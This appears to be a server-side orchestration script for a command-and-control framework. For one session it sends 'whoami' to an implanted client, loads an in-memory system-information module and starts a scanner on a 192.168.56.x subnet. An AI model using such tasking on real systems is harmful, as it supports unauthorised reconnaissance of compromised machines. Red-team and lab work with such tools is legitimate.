// This script runs on the SERVER.
// It decides which logic to deploy to the CLIENT.

fn run(session_id) {
    print("Orchestrating Survey for Session: " + session_id);

    // 1. Run a basic shell command first
    send_c2_command(session_id, "whoami");

    // 2. Deploy the 'sysinfo' extension (In-Memory)
    // Pass empty array [] for no args
    let res1 = send_c2_extension(session_id, "sysinfo", []);
    
    // 3. Deploy the 'scanner' extension with arguments
    // Scan local network for web ports
    let res2 = send_c2_extension(session_id, "scanner", ["http://192.168.56."]);

    return "Deployed: " + res1 + " and " + res2;
}
